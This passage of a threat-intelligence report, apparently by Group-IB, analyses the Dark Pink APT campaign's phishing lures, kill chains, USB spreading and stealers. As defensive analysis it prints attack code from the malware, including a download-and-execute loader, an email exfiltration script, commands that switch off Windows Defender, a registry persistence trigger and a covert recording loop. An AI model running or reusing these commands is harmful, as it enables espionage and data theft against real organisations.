His efforts made a major contribution to this blog and for our future\nresearch into this APT group.\n\n## Introduction\n\nCountries of the Asia-Pacific region have long been the target of advanced persistent threat\n(APT) groups. [Earlier Group-IB research found that this region has often been a “key arena”](https://explore.group-ib.com/htct/hi-tech_crime_2020#page=1)\nof APT activity, and a mixture of nation-state threat actors from China, North Korea, Iran,\nand Pakistan have been tied to a wave of attacks in the region. More often than not, the\nprimary motive for APT attacks in the Asia-Pacific (APAC) region is not financial gain, but\nrather espionage.\n\n**Group-IB continuously explores and analyzes the methods, tools, and tactics**\n**[used by some of the world’s most prominent APT groups, such as APT41, but how](https://www.group-ib.com/blog/apt41-world-tour-2021/)**\ncan large-scale companies and organizations protect themselves when a new APT group\nemerges, or, if an already existing APT group begins to utilize a completely new toolkit. Enter\nDark Pink.\n\n**Dark Pink is the name given by Group-IB to a new wave of APT attacks that has**\n**struck the APAC region. At the present time, Group-IB cannot attribute the campaign to**\nany known threat actor, making it highly likely that Dark Pink is an entirely new APT\n**group. Bearing this in mind, we will refer to Dark Pink as an APT group throughout the**\nentirety of this text. The name Dark Pink was coined by forming a hybrid of some of the email\naddresses used by the threat actors during data exfiltration. The APT group has also been\n[termed Saaiwc Group by Chinese cybersecurity researchers.](https://mp.weixin.qq.com/s/G3gUjg9WC96NW4cRPww6gw)\n\nThere is evidence to suggest that Dark Pink began operations as early as mid-2021, although\nthe group’s activity surged in mid-to-late 2022. To date, Group-IB’s sector-leading\n**Threat Intelligence** **uncovered seven confirmed attacks by Dark Pink. The bulk of**\nthe attacks were carried out against countries in the APAC region, although the threat actors\nspread their wings and targeted one European governmental ministry. The confirmed victims\ninclude two military bodies in the Philippines and Malaysia, government\n**agencies in Cambodia, Indonesia and Bosnia and Herzegovina, and a religious**\n**organization in Vietnam. Group-IB also became aware of an unsuccessful attack on a**\nEuropean state development agency based in Vietnam. In line with Group-IB’s zero tolerance\n\n\n-----\n\npolicy to cybercrime, confirmed and potential victims of Dark Pink were issued\n**proactive notifications, and we note that the list of companies breached by this particular**\nAPT group is likely to be longer.\n\nGroup-IB’s early research into Dark Pink has revealed that these threat actors are leveraging\na new set of tactics, techniques, and procedures rarely utilized by previously known APT\ngroups. They leverage a custom toolkit, featuring TelePowerBot, KamiKakaBot, and Cucky\n_and Ctealer information stealers (all names dubbed by Group-IB) with the aim of stealing_\nconfidential documentation held on the networks of government and military organizations.\nOf particular note is Dark Pink’s ability to infect even the USB devices attached to\n**compromised computers, and also its ability to gain access to messengers on**\n**infected machines. Furthermore, Dark Pink threat actors utilize two core techniques: DLL**\nSide-Loading and executing malicious content triggered by a file type association\n[(Event Triggered Execution: Change Default File Association). The latter of these tactics is](https://attack.mitre.org/techniques/T1546/001/)\none rarely seen utilized in the wild by threat actors.\n\nAt the time of writing, Dark Pink is still active. Given the fact that many of the attacks\n**identified by Group-IB researchers took place in the final months of 2022,**\nGroup-IB researchers are still in the process of identifying the full scope of the APT attack,\nand efforts to uncover the origin of this APT group are in process. However, we believe that\nthis preliminary research, which will be of great interest to CISO, heads of cybersecurity\nteams, SOC analysts and incident response specialists, will go a long way to raising awareness\nof the new TTPs utilized by this threat actor and help organizations to take the relevant\n**steps to protect themselves from a potentially devastating APT attack.**\n\n## Key findings\n\n**Dark Pink launched seven successful attacks against high-profile targets**\nbetween June and December 2022.\nDark Pink’s first activity, which we tie to a Github account leveraged by the threat\nactors, was recorded in mid-2021, and the first attack attributable to this APT\n**group took place in June 2022. Their activity peaked in the final three months of**\n2022 when they launched four confirmed attacks.\nDark Pink’s victims are located in five APAC countries (Vietnam, Malaysia, Indonesia,\nCambodia, Philippines) and one European country (Bosnia and Herzegovina).\nVictims included military bodies, government and development agencies, religious\norganizations, and a non-profit organization.\nOne unsuccessful attack was launched against a European state development agency\nbased in Vietnam in October 2022.\n**Dark Pink APT’s primary goals are to conduct corporate espionage, steal**\ndocuments, capture the sound from the microphones of infected devices, and exfiltrate\ndata from messengers.\n\n\n-----\n\n**Dark Pink s core initial vector was targeted spear-phishing emails that saw**\nthe threat actors pose as job applicants. There was evidence to suggest that the threat\nactors behind Dark Pink scanned online job vacancy portals and crafted unique emails\nto victims that were advertising vacancies.\nAlmost all the tools leveraged by the threat actors were custom and self-made,\nincluding TelePowerBot and KamiKakaBot, along with the Cucky and Ctealer stealers.\nDuring our investigation, we noticed only one public tool: PowerSploit/Get_MicrophoneAudio._\n**Dark Pink APT utilized a rarely seen technique, termed Event Triggered**\n**Execution: Change Default File Association, to ensure launch of malicious**\nTelePowerBot malware. Another technique leveraged by these particular threat actors\nwas DLL Side-Loading, which they used to avoid detection during initial access.\n**The threat actors created a set of PowerShell scripts to carry out**\ncommunication between victim and threat actors’ infrastructure, facilitate lateral\nmovement and network reconnaissance.\nAll communication between infected infrastructure and the threat actors behind Dark\nPink is based on Telegram API.\n\n## Dark Pink takes on all comers\n\nThe attacks carried out by this particular APT group have been advanced in every sense of\nthe word. They have utilized a sophisticated mixture of custom tools to breach the defenses of\nmultiple government and military organizations. The first attack Group-IB analysts\n**were able to attribute to this APT group was registered on a religious**\n**organization in Vietnam in June 2022. However, they appear to have been active well**\nbefore that, as Group-IB researchers identified a Github account used by these threat actors\nwhich showed activity dating back to mid-2021. According to our research, the malware\ninitialized by the threat actors can issue commands for an infected machine to download\nmodules from this particular Github account. Interestingly, the threat actors appeared to\n**use only one Github account for the entire duration of the campaign to date, which could**\nsuggest that they have been able to operate without detection for a significant period of time.\n\n\n-----\n\nFigure 1: Screenshot detailing activity on Github account attributed to Dark Pink APT in 2021 (above) and\n\n2022 (below)\n\nFollowing the June 2022 attack, Group-IB researchers were unable to attribute any other\nmalicious activity to Dark Pink. However, this APT group burst into life towards the end of\nthe summer, when Group-IB noticed an attack on a Vietnamese non-profit\n**organization in August 2022 bearing all the hallmarks of the June attack. From then,**\nGroup-IB was able to attribute one attack in September, two attacks (one successful, one\nunsuccessful) in October, two in November, and one in December. Most recently, Group-IB\ndiscovered that Dark Pink was able to breach an Indonesian governmental\n**organization on December 8, 2022.**\n\n\n-----\n\nFigure 2: Dark Pink APT timeline and targets\n\n## Kill Chain\n\nThe sophistication of the Dark Pink campaign is evidenced by its multiple distinct kill\nchains. The threat actors behind this wave of attacks were able to craft their tools\n**in several programming languages, giving them flexibility as they attempted to breach**\ndefense infrastructure and gain persistence on victims’ networks. As a result, we will discuss\nthe different steps and stages of these processes, but it is important to note that the bulk of\nthe attacks were based on PowerShell scripts or commands that aimed to launch\ncommunication between the infected networks and the threat actors’ infrastructure.\n\nInitial access was achieved by successful spear-phishing emails. These messages contained a\nshortened link directing the victim to download a malicious ISO image, which in one case\nseen by Group-IB, was stored on the public, free-to-use sharing service MediaFire. Once the\nISO image was downloaded by the victims, Group-IB identified three distinct infection\nchains, which we will detail below.\n\nThe first thing that caught our attention was that all communication between the devices of\nthe threat actors and the victims was based on Telegram API. The custom modules created\nby the threat actors, TelePowerBot and KamiKakaBot, are designed to read and execute\n\n\n-----\n\ncommands via a threat actor-controlled Telegram bot. Interestingly, these modules were\ndeveloped in different programming languages. TelePowerBot is represented as PowerShell\nscript, while KamiKakaBot, which includes stealer functionalities, is developed on .NET. The\nthreat actors have used the same Telegram bots for a long period of time, as one has been\nused since September 2021.\n\nAdditionally, Dark Pink APT utilizes the self-made stealers Ctealer and Cucky to\n**steal victim credentials from web browsers. We will look at each of the above**\nmentioned tools later in this report. At this stage, we will turn to detailing each step of the\ninfection chain.\n\n### Initial access\n\nA large part of the success of Dark Pink was down to the spear-phishing emails used to gain\ninitial access. In one such attack, Group-IB was able to find the original email sent by the\nthreat actors. In this one instance, the threat actor posed as a job applicant applying for the\nposition of PR and Communications intern. In the email, the threat actor mentions that they\nfound the vacancy on a jobseeker site, which could suggest that the threat actors scan job\n**boards and use this information to create highly relevant phishing emails.**\n\nThe emails contain a shortened URL linking to a free-to-use file sharing site, where the\n**victim is presented with the option to download an ISO image that contains all the**\nfiles needed for the threat actors to infect the victim’s network. During our investigation into\nDark Pink, we discovered that the threat actors leveraged several different ISO images, and\nwe also noted that the documents contained in these ISO images varied from case to case.\nAccording to the information available to us, we strongly believe that the Dark Pink threat\n**actors craft a unique email to each victim, and we do not discount that the threat**\nactors can send the malicious ISO image as a direct attachment to the victim via email.\n\n\n-----\n\nFigure 3: Screenshot of original spear-phishing email sent by Dark Pink APT noting the storage of the ISO\n\nimage on a file-sharing site.\n\nThe ISO images sent in the spear-phishing emails contained varying numbers of files.\nHowever, there are three types of file found in all of the ISO images sent by the\n**threat actors: a signed executable file, a nonmalicious decoy document (e.g. .doc,**\n.pdf, or .jpg), and a malicious DLL file. Given that the email relates to a job opening, one\ncan assume that the victim will first look for the supposed applicant’s resume, which is often\nsent as a MS Word document. However, In Dark Pink attacks, the threat actors include an\n.exe file in the ISO image that mimics a MS Word file. The file contains “.doc” in the file name\nand contains the MS Word icon as a means of confusing the victim and thinking that the file\nis safe to open.\n\n\n-----\n\nFigure 4: Screenshot detailing the five files contained in one ISO image seen by Group-IB. Note that the\n\n.doc and .dll files are in hidden view.\n\nShould the victim execute the .exe file first, the malicious DLL file, located in the same folder\nas the .exe file, will run automatically. This is a technique used by threat actors known as\n[DLL Side-Loading. The primary function of the DLL execution is to ensure that the threat](https://attack.mitre.org/techniques/T1574/002/)\nactors’ core malware, TelePowerBot, gains persistence. Before the completion of the file\nexecution, the decoy document (e.g. a letter, resume), is shown on the victim’s screen.\n\n### Trojan execution and persistence\n\nOne of the most interesting discoveries for Group-IB researchers was the process of how\n_TelePowerBot or KamiKakaBot are launched on the victim’s machine. As mentioned_\npreviously, the malicious DLL file that contains one of these two pieces of malware can be\nlocated inside the ISO image that is sent during spear-phishing campaigns. In one case\nanalyzed by Group-IB, the threat actors used a chain of MS Office documents and\n**leveraged** **[Template Injection, whereby the threat actors insert into the initial document](https://attack.mitre.org/techniques/T1221/)**\na link to a template document that contains a malicious macro code. In two other cases\nexamined by Group-IB researchers, the threat actors behind Dark Pink launched\n**their malware by the DLL Side-Loading technique. In total, we found three different**\nkill chains leveraged by the threat actors, and we will detail them below.\n\n### Kill Chain 1: All-inclusive ISO\n\nThe first variant of the infection chain results in an ISO image being sent to the victim\nthrough spear-phishing emails. This ISO image includes a malicious DLL file, which contains\n_TelePowerDropper (name given by Group-IB). The primary goal of this DLL file is to gain_\npersistence for TelePowerBot in the registry of the infected machine. In some cases, the DLL\nfile can also launch the threat actors’ proprietary stealer Stealer, which parses data from\nbrowsers on the victim’s machine and stores it in a local folder. It is important to note that\nlaunching any kind of stealer is optional during initial access. Dark Pink can send special\n**commands to download and launch a stealer during all phases of attack.**\n\n\n-----\n\nFigure 5: Graphic detailing the full scheme of Kill Chain 1\n\nIt is important to note at this stage that the DLL files are packed. When the file is launched, it\ndecrypts itself and passes control to an unpacked version of itself. Additionally, once the DLL\nfile is launched, a mutex will be created. One example of this was: gwgXSznM-Jz92k33A_uRcCCksA-9XAU93r5. Upon completion of this step, a command to start TelePowerBot will_\nbe added to autorun. This means that TelePowerBot will be launched each time the user logs\ninto their system. This is facilitated by creating a registry key by path\n_HKCU\\Environment\\UserInitMprLogonScript. The value of the created key is as follows:_\n```\nforfiles.exe /p %system32% /m notepad.exe /c \"cmd.exe /c whoami >> %appdata%\\a.abcd\n&& %appdata%\\a.abcd && exit\"\n\n```\nThe above code reveals that the command launches a standard utility, whoami, which shows\ninformation about the current user of the machine. The output is redirected to a file and\nexecution is finished.\n\nAt this point it might not be entirely clear how the next stage, and the launching of\nTelePowerBot, begins. The key to this answer is the file extension .abcd. In short, the threat\nactors create a file with this extension name as part of a technique termed Event Triggered\n\n\n-----\n\n[Execution: Change Default File Association. The idea is to add a handler to work with the](https://attack.mitre.org/techniques/T1546/001/)\nunrecognized file extension in the registry key tree. This is detailed in the below screenshot.\n\nFigure 6: Screenshot detailing command to run upon creation of file with extension .abcd\n\nThe above screenshot details part of a PowerShell command that is triggered when a file is\ncreated with the specific extension .abcd. The PowerShell commands are stored in base64\nview and are highly obfuscated. The result of these commands are relatively simple: read\nregistry key, decrypt, and launch TelePowerBot.\n\n### Kill Chain 2: Github macros\n\nThe second variation of the infection chain is almost identical to the preceding one. The only\nthing that differs is the file used in the initial stage. During our analysis, we discovered that\nthe threat actors used commands to automatically download a malicious\n**template document containing TelePowerBot from Github upon opening of the .doc**\ncontained in the initial ISO file. Macro code written into this template document then works\nto ensure persistence for the malware.\n\n\n-----\n\nFigure 7: Graphic detailing the full scheme of Kill Chain 2\n\nIn this instance, the ISO image sent to the victims contains a MS Word document that leads\nto the automatic download of a malicious template document, which contains TelePowerBot,\nfrom Github. In order to evade antivirus defenses on an infected machine during initial\naccess, macro code is written into the template document. This technique is known as\n[Template Injection. The macro contains several forms with fields, and during execution, the](https://attack.mitre.org/techniques/T1221/)\nvalue of these form fields are read and established as a value in registry keys.\n\nThis trick can help the malware avoid detection by antivirus software, as the document itself\ndoes not contain any malicious functionalities or code. The coded documents contain forms\nwith several parameters, and the macros contained in these files can read these values and\nwork to ensure persistence of TelePowerBot on the victim’s machine.\n\n\n-----\n\nFigure 8: Screenshot detailing two forms contained predefined keys and values that are written to the\n\nregistry by the malicious macro code written into the MS Word file sent to victims\n\n### Kill Chain 3: X(ML) marks the spot\n\nThe third and final kill chain variant that we will detail is one that was used in the most\n**recent Dark Pink attack analyzed by Group-IB, which saw the threat actors breach**\n**the network of an Indonesian government agency on December 8, 2022. The ISO**\nimage sent to the victim in a spear-phishing email contained decoy documents, a signed\nlegitimate MS Word file, and a malicious DLL named KamiKakaDropper. The primary goal\nof this infection vector is to persist KamiKakaBot on infected machines. In this kill chain, an\n_XML file is located at the end of the decoy document in encrypted view. The malicious DLL_\nfile is, as in Kill Chain 1, launched by the DLL Side-Loading technique. Once the DLL file is\nlaunched, the XML file that kicks off the next stage of the kill chain will be decrypted from\nthe decoy document and saved in the infected machine.\n\n\n-----\n\nFigure 9: Graphic detailing the full scheme of Kill Chain 3\n\nThe XML file contains an MSBuild project that includes a task to execute .NET code. To find\n[more about how this process works, please refer to the following Microsoft documentation.](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-tasks?view=vs-2022)\nThe logic of the .NET code is simple: launch KamiKakaBot, which itself is located in the XML\nfile (packed and encoded in base64 format). After this file is unpacked, control is passed to\nKamiKakaBot.\n\nFigure 10: Snippet of code inside XML file that unpacks and launches KakaKamiBot\n\n\n-----\n\nThe path to the XML file is passed as an argument upon the launch of MSBuild. The\ncommand to run MSBuild is located in the registry key\n(HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell), which is\ncreated during execution of the DLL file. Once this step is completed, MSBuild will run each\ntime a user logs on to the system. In addition, the DLL creates a repeatable task to log the\nvictim off from the system.\n\n## Reconnaissance and lateral movement\n\nAfter infecting a computer in the victim organization’s network, the next goal for Dark\n**Pink is to collect as much information as possible about the victim’s network**\n**infrastructure. From our analysis, we see that the threat actors are interested in the**\nfollowing:\n\ninformation from standard utility, e.g output of standard utility systeminfo.\ninformation from web browsers.\ninstalled software, including antivirus solutions.\ninformation about connected USB devices and network sharing.\n\n**The threat actors also collect a list of network and USB drives that are available for**\nwriting, and these are then used for lateral movement. Next, instead of the original file, the\nattack sees the creation of a LNK file (Windows shortcut) with a command to launch\nTelePowerDropper. At this stage, the original files are hidden from the user.\n\nOne of the most interesting revelations of our investigation into Dark Pink was how the\n**threat actors carry out lateral movement over USB devices. For this, a new WMI**\nevent handler is registered. From this point onwards, each time a USB flash drive is plugged\ninto an infected machine, a specific action will be executed that sees TeleBotDropper\ndownloaded and stored on the flash drive. Let’s analyze this process a little deeper.\n\n1. Victim plugs USB flash drive into infected device\n2. The WMI event is triggered, and results in the automatic download of a .ZIP archive\n\nfrom the threat actors’ Github account. There are three files inside this archive:\n_Dism.exe, Dism.sys, and Dismcore.dll. The first of these files is a legitimate file with a_\nvalid digital signature. The functionality of the DLL file is to unpack the original\nexecutable from file Dism.sys.\n3. Archive is extracted to %tmp% folder. The files are then copied to the USB device,\n\nwhere a new folder named “dism” is created. The folder attribution is changed to\nhidden and system.\n4. A file named system.bat is created, containing a command to launch Dism.exe\n\n5. Finally, as many LNK files are created as there are folders on the USB drive. The\n\nattributes of the original folder are changed to hidden and system. A LNK file is created\nwith a command to open the hidden folder in explorer.exe and launch system.bat.\n\n\n-----\n\nFollowing this process, the user will see LNK files bearing the same name as folders found on\nthe USB device. Once the user opens this malicious LNK file, TeleBotDropper will be\nlaunched by the DLL Side-Loading technique (the functionalities of TeleBotDropper have\nbeen already shown in the previous section). As a result, the commands, which read registry\nkey, decrypt, and launch TelePowerBot, are then transferred to a new machine. It is\nimperative to remember that this solution works if there is only one folder on the USB device.\nThis is why we observed different implementations, for example, the creation of LNK files\ninstead of .pdf files (not only for folders) on USB devices. An example of how this works in\nmore detail is provided in APPENDIX B. The mechanism of creating LNK files in place of the\noriginal files is also used for network sharing.\n\n## Data exfiltration\n\nAs is the case with many other attacks of this kind, the threat actors exfiltrate data through\nZIP archives. During Dark Pink attacks, all data (list of files from common network shares,\nweb browser data, documents, etc.) that is to be sent to the threat actors is stacked in the\n_$env:tmp\\backuplog folder. However, the collection and sending process operate separately_\nfrom one another. When the infected machine is issued a command to download the\n_$env:tmp\\backuplog folder, the list of files will be copied to $env:tmp\\backuplog1 folder,_\nadded to archive and sent to the threat actors’ Telegram bot. After this step is completed, the\n_$env:tmp\\backuplog1 directory is deleted._\n\n**Dark Pink threat actors can also leverage their self-made stealers Cucky and**\n**_Ctealer to draw data from infected machines. The functionalities of both of these_**\nstealers are the same. They can be used to extract data such as passwords, history, logins, and\ncookies from web browsers. The stealers themselves do not require any internet connection,\nas they save the result of the execution (stolen data) to files. Both of the stealers can be\ndownloaded from the threat actors’ Github account automatically by commands issued by the\nmalware. An example of the script used to launch Cucky is shown in APPENDIX C.\n\nIn total, Group-IB researchers discovered that Dark Pink exfiltrated files via three\n**separate pathways. The first of these pathways sees the threat actors use Telegram to**\nreceive files. As a device is infected, information is collected in a specific folder by the\nmalware and sent via Telegram by a special command. By extension, the files that are sent to\nthe threat actors are: .doc, .docx, xls,.xlsx,.ppt,.pptx,.pdf. An example of a script that carries\nout this process can be found in APPENDIX D.\n\nIn addition to Telegram, Group-IB found evidence that the threat actors exfiltrated\n**files via Dropbox. This method is slightly different to the one used to exfiltrate via**\nTelegram, as it involves a series of PowerShell scripts that transfer files from a specific folder\nto a Dropbox account by performing a HTTP request with a hardcoded token.\n\n\n-----\n\nOne particular attack discovered by Group-IB was of particular surprise to us. Despite the\ndevice being controlled by commands issued by a threat actor-controlled Telegram channel\nvia Telegram bots, some interesting files were sent via email. An example of this command is\nshown below.\n```\n$filepath=\"$env:tmp/backuplog\";\n\n$cred = New-Object System.Management.Automation.PSCredential\n(\"lanhuong.jsc@outlook.com\",(ConvertTo-SecureString \"CHANGED\" -AsPlainText -Force));\n\nSend-MailMessage -To \"blackpink.301@outlook[.]com\" -From \"blackred.113@outlook[.]com\"\n\n  -Body \"hello badboy\" -SmtpServer \"smtp-mail.outlook.com\" -Port 587\n\n  -Subject \"$env:computername\" -UseSsl -Credential $cred\n\n  -Attachments (gci $filepath).fullname\n\n\n```\nThe list of emails used during data exfiltration are shown below:\n\n_blackpink.301@outlook[.]com_\n\n_alibaba.113@outlook[.]com_\n\n_alibaba.113@outlook[.]com.vn_\n\n_blackred.113@outlook[.]com_\n\n_lanhuong.jsc@outlook[.]com_\n\n_nphuongmai.97@outlook[.]com_\n\nAt this stage, Group-IB researchers believe that the exfiltration method of choice depends on\nthe potential restrictions set out in the victim’s network infrastructure.\n\n## Evasion techniques\n\nDuring their attacks, the threat actors used an already known technique to bypass User\nAccount Control (UAC) to alter the settings in Windows Defender. They did this by elevating\nthe COM interface. The methods used are not unique and different implementations were\nfound in different programming languages.\n\n\n-----\n\nFigure 11: Screenshot of decompiled executable that allows UAC to be bypassed\n\nThe settings are changed by a special PowerShell script which is received as a command, and\nimplemented in .NET application. This command comes in the form of an executable file (in\nbase64 view) that is automatically downloaded from Github upon infection. The executable\ndoes not gain persistence nor is it saved on an infected system. The executable does not\npersist and is not saved into an infected system. An example of downloading and launching\nare shown below.\n```\n[Reflection.Assembly]::Load([System.Convert]::FromBase64String((New-Object\nSystem.Net.WebClient).DownloadString(URL)));\n\n[NETLUA.Main]::BypassUAC(\"powershell\\\", \\\"-c {$command}\")\n\n```\nThe PowerShell command to modify Windows Defender Settings is passed as an argument\nand is shown as follows:\n```\nSet-MpPreference -DisableArchiveScanning $true -ea 0;\n\nSet-MpPreference -DisableBehaviorMonitoring $true -Force -ea 0;\n\nSet-MpPreference -DisableCatchupFullScan $true -Force -ea 0;\n\nSet-MpPreference -DisableCatchupQuickScan $true -Force -ea 0;\n\nSet-MpPreference -DisableIntrusionPreventionSystem $true -Force -ea 0;\n\nSet-MpPreference -DisableIOAVProtection $true -Force -ea 0;\n\nSet-MpPreference -DisableRealtimeMonitoring $true -Force -ea 0;\n\nSet-MpPreference -DisableRemovableDriveScanning $true -Force -ea 0;\n\nSet-MpPreference -DisableRestorePoint $true -Force -ea 0;\n\nSet-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -Force -ea 0;\n\nSet-MpPreference -DisableScanningNetworkFiles $true -Force -ea 0;\n\nSet-MpPreference -DisableScriptScanning $true -Force -ea 0;\n\nSet-MpPreference -EnableControlledFolderAccess Disabled -Force -ea 0;\n\nSet-MpPreference -EnableNetworkProtection AuditMode -Force -ea 0;\n\nSet-MpPreference -MAPSReporting Disabled -Force -ea 0;\n\nSet-MpPreference -SubmitSamplesConsent NeverSend -Force -ea 0;\n\nSet-MpPreference -PUAProtection Disabled -Force -ea 0\n\n\n```\nThe PowerShell commands will be executed using the .NET application as a tool for privilege\nescalation.\n\n## Tools\n\n### Cucky\n\nCucky is a simple custom stealer developed on .NET. A variety of samples were found during\nthe investigation. The most analyzed versions were packed by Confuser. It does not\ncommunicate with the network, and collected information is saved in the folder\n_%TEMP%\\backuplog. Cucky is able to draw data such as passwords, history,_\n**logins, and cookies from targeted web browsers. Although we do not have any**\ninformation related to the use of stolen data, we suppose that it can be used to gain access to\n\n\n-----\n\nemail web clients, conduct additional infrastructure reconnaissance based on web history,\ncompile a list of organization employees, distribute malicious attachments, and assess\nwhether the compromised machine is real or virtual.\n\n**Cucky has the functionality to steal data from the following browsers:**\n\nChrome, MS Edge, CocCoc, Chromium, Brave, Atom, Uran, Sputnik, Slimjet, Epic Privacy,\nAmigo, Vivaldy, Kometa, Comodo, Nichrome, Maxthon, Comodo Dragon, Avast Browser,\nYandex Browser.\n\nFigure 12: Screenshot of decompiled Cucky stealer\n\nThe sample found contained the path below to debug information:\n\nC:\\Users\\hoang\\source\\repos\\Cucky\\Cucky\\obj\\Release\\net46\\Cucky.pdb\n\n### Ctealer\n\nCtealer is an analog of Cucky but developed on C/C++. TelePowerDropper or a special\ncommand issued by the threat actors can be used to deploy Ctealer. The working process is\npretty similar to Cucky as well, as it also saves collected files to the %TEMP%\\backuplog\nfolder. Ctealer can draw information from the following web browsers:\n\nChrome, Chromium, MS Edge, Brave, Epic Privacy, Amigo, Vivaldi, Orbitum, Atom, Kometa,\nDragon, Torch, Comodo, Slimjet, 360 Browser, Maxthon, K-Melon, Sputnik, Nichrome,\nCocCoc, Uran, Chromodo, Yandex Browser.\n\nThe sample found contained the path below to debug information:\n\nC:\\Users\\build\\source\\repos\\CtealWebCredential\\Release\\CtealWebCredential.pdb\n\n### TelePowerBot\n\n\n-----\n\nAs we have already noted, TelePowerBot will be launched every time a user of an\n**infected machine logs into the system. When this happens, a special script will be**\nlaunched. The script reads the value of another regkey (e.g\n_HKCU\\SOFTWARE\\Classes\\abcdfile\\shell\\abcd), which begins decryption and launch of_\nTelePowerBot. The encryption is based on xor where the key is an array number from 0 to\n256. Before decryption, the original payload will be decoded from base64. The deobfuscated\ncommand example is shown below:\n```\niex(\n\n [System.Text.Encoding]::UTF8.GetString(\n\n          ([System.Convert]::FromBase64String(\n\n              (gp \"HKCU:\\\\SOFTWARE\\\\Classes\\\\abcdfile\\\\shell\" -Name\n\"abcd\").\"abcd\") | % -Begin{$i=0} -Process{\n\n                   $_ = $_ -bxor $i%256;$i++;$_\n\n              }\n\n          )\n\n     )\n\n) | iex\n\n\n```\nThe decrypted stage is not final. It is an intermediate stage and also is based on PowerShell\nand is highly obfuscated. At this stage, the final script has already been stored in the stager\nbut it is separated into blocks. From this, a base64 string is created, and after decoding, we\nwill be left with a ZIP stream. Finally, after all this, TelePowerBot is launched after\nunzipping.\n\nThis kind of tool communicates with a Telegram channel to receive new tasks from the threat\nactors. The bot can communicate with various infected devices, and the bot\n**checks for new commands every 60 seconds. During execution, the bot works with**\ntwo register keys: HKCU\\Environment\\Update and HKCU\\Environment\\guid. The first\none stores the last message id, which is processed from the Telegram bot (The parameter\n_update_id from Telegram). The second key stores the unique identification of infected_\nmachines. It is generated by command [guid]::NewGuid() when the bot launches for the first\ntime. Upon registration, the threat actors get various pieces of information about the infected\nmachine such as ip, guid, computer name. The IP address is also ascertained via a get request\n[to https://ifconfig.me/ip. These processes are also based on PowerShell commands, and we](https://ifconfig.me/ip)\nwill dig a little deeper into those later in the report. The bot implementation is shown in\nAPPENDIX A.\n\nSome variants of this module contain additional functionality for ensuring lateral movement.\nAll other functionalities are the same. In cases that Group-IB analyzed, the Telegram\nparameter can either be hardcoded in the scripts or read from the registry key.\n\n### KamiKakaBot\n\n\n-----\n\nKamiKakaBot is the .NET version of TelePowerBot, and we found very few differences\nbetween the pair of them. Before commands are read, KamiKakaBot is able to exfiltrate from\nthe Chrome, MS Edge, and Firefox browsers. It is able to update itself and once it receives\ncommands, it can pass an argument to the cmd.exe process.\n\nFigure 13: Screenshot detailing decompiled executable that contains KamiKakaBot\n\n### PowerSploit/Get-MicrophoneAudio\n\nAs we have noted above, the threat actors behind Dark Pink almost exclusively\n**leveraged custom made tools. However, to record the microphone audio from infected**\ndevices, they turned to a publicly available PowerSploit module – Get-MicrophoneAudio.\nThis is loaded onto the victim’s machine via download from Github. Group-IB\n**researchers found that antivirus software on victim machines blocked this**\n**process when the threat actors attempted to launch the module. We found that the**\nthreat actors attempted to obfuscate the original PowerSploit module to make it\nundetectable, and these were unsuccessful. As a result, the threat actors returned to the\ndrawing board and added a script (below) that was successfully able to record the\nmicrophone audio on infected devices.\n```\nStart-Job {\n\n while(1){\n\n     ps psr -erroraction 'silentlycontinue' | kill -force;sleep 30;\n\n     ni \"$($env:tmp)\\\\record\" -ItemType Directory -erroraction 'silentlycontinue';\n\n     start psr -ArgumentList \"/start /output $($env:tmp)\\\\record\\\\$((getdate).tostring('yyyyMMddHHmmss')).zip /sc 1 /gui 0\";\n\n     sleep 60;\n\n     start psr -ArgumentList \"/stop\"\n\n }\n\n}\n\n\n```\nThis simple script launches a background task that triggers a standard utility PSR to capture\nsound every minute. The recorded audio files will be saved inside a ZIP archive that is located\nin a temporary folder (%TEMP%\\record). The files are named according to the following\n\n\n-----\n\ntemplate: yyyyMMddHHmmss . These audio files are then exfiltrated with a separate script\nthat sends them (as a ZIP archive), to the threat actors’ Telegram bot.\n\n### ZMsg (Messenger exfiltration)\n\n**The threat actors are also interested in stealing data from messengers on**\n**infected devices. To this end, they are able to execute commands to identify leading**\nmessengers, such as Viber, Telegram, and Zalo. In the case of Viber, these commands allow\nthe threat actors to exfiltrate the %APPDATA%\\Viberpc folder on infected devices, which\nallows them to gain access to the messages and contact lists of the victims. We are still doing\nwork to assess what the threat actors are able to draw from Telegram accounts on infected\ndevices, but the case of Zalo is one that piqued our interest.\n\nIf Zalo messenger is present on the victim’s device, the threat actors can launch a command\nto download a special utility (dubbed ZMsg by Group-IB), from Github. This utility, which is\na .NET application based on the FlaUI library, allows the threat actors to exfiltrate the\nvictim’s messages on the Zalo platform. FlaUI is a library that assists with the automatic UI\ntesting of Windows applications, with the entry point usually an application or the desktop to\ngenerate an automation element. Through this, it is possible to analyze sub-elements and\ninteract with them.\n\nZMsg iterates elements on Windows applications to discover those with particular names.\nFor example, the element with messages has the name “messageView”. All collected\ninformation is stored in the %TEMP%\\KoVosRLvmU\\ folder in files with the .dat and .bin\nextensions. File names are created as an encoded hex string, and are generated in accordance\nwith the below template:\n\n_%PERSON_NAME%_%DAY%_%MONTH%_%YEAR%_\n\n## Commands\n\n**The threat actors issue commands to an infected device by specifying ip,**\n**computer name, or botid. Tasks can also be issued to all infected devices simultaneously.**\nDuring our examination, we noticed several different kinds of commands. The functionalities\nof some of these commands overlap, but they are based on PowerShell commands. For\nexample, TelePowerBot can execute a simple standard console tool, such as whoami, or a\ncomplex PowerShell script.\n\nDuring infection, the threat actors execute several standard commands (e.g. net\nshare, Get-SmbShare) to determine what network resources are connected to the infected\ndevice. If network disk usage is found, they will begin exploring this disk to find files that\nmay be of interest to them and potentially exfiltrate them. In the prior section, we noted how\n**Dark Pink threat actors carry out lateral movement. In this campaign, the threat**\n\n\n-----\n\nactors can also infect files on USB disks attached to the infected devices. The script below\ndetails how the threat actors compile a list of network shares and the removable devices\nconnected to the machine.\n```\n(gwmi cim_logicaldisk|?{($_.drivetype -eq 2)-and(Test-path\n$($_.deviceid)\\\\)}).deviceid;\n\n(get-smbshare|?{($_.name -notlike \"*$\")-and($_.name -ne Users)-and($_.path -like\n*:\\\\*)}).path;\n\n(Get-SMBMapping|?{$_.Status -eq \"OK\"}).remotepath|?{$_ -notlike '*\\\\IPC$'}\n\n\n```\n**The threat actors can also issue a command to take a screenshot of the desktop**\n**of the compromised device and save these in the %TEMP% directory. They then**\ndownload the images by issuing the below command.\n```\nAdd-type -AssemblyName System.Drawing\n\nAdd-Type -AssemblyName 